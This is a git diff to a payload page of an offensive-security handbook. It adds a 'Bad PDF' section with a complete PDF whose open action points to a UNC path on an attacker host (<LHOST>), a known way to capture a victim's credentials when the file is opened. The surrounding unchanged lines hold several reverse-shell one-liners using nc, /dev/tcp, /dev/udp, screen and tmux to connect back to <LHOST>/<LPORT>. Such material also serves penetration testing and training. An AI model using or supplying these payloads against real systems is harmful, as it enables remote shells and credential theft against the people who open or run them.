@@ -5,6 +5,7 @@
 ## Table of Contents
 
 - [Background Reverse Shells](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Background-Reverse-Shells)
+- [Bad PDF](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Bad-PDF)
 - [Bash Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Bash-Reverse-Shell)
 - [curl Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#curl-Reverse-Shell)
 - [Exiftool](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Exiftool)
@@ -75,6 +76,68 @@ $ (mkfifo /tmp/K98LmaT; nc <LHOST> <LPORT> 0</tmp/K98LmaT | /bin/sh >/tmp/K98Lma
 $ script -c 'bash -i' /dev/null </dev/udp/<LHOST>/<LPORT> >&0 2>&1 &
 $ screen -md bash -c 'bash -i >/dev/tcp/<LHOST>/<LPORT> 2>&1 0<&1' -md ('start a new detached process')
 $ tmux new-session -d -s mysession 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
+```
+
+## Bad PDF
+
+```c
+%PDF-1.7
+1 0 obj
+<</Type/Catalog/Pages 2 0 R>>
+endobj
+2 0 obj
+<</Type/Pages/Kids[3 0 R]/Count 1>>
+endobj
+3 0 obj
+<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
+endobj
+xref
+0 4
+0000000000 65535 f
+0000000015 00000 n
+0000000060 00000 n
+0000000111 00000 n
+trailer
+<</Size 4/Root 1 0 R>>
+startxref
+190
+3 0 obj
+<< /Type /Page
+   /Contents 4 0 R
+   /AA <<
+    /O <<
+       /F (\\\\<LHOST>\\<FILE>)
+    /D [ 0 /Fit]
+    /S /GoToE
+    >>
+    >>
+    /Parent 2 0 R
+    /Resources <<
+   /Font <<
+    /F1 <<
+     /Type /Font
+     /Subtype /Type1
+     /BaseFont /Helvetica
+     >>
+      >>
+    >>
+>>
+endobj
+4 0 obj<< /Length 100>>
+stream
+BT
+/TI_0 1 Tf
+14 0 0 14 10.000 753.976 Tm
+0.0 0.0 0.0 rg
+(PDF Document) Tj
+ET
+endstream
+endobj
+trailer
+<<
+ /Root 1 0 R
+>>
+%%EOF
 ```
 
 ## Bash Reverse Shell
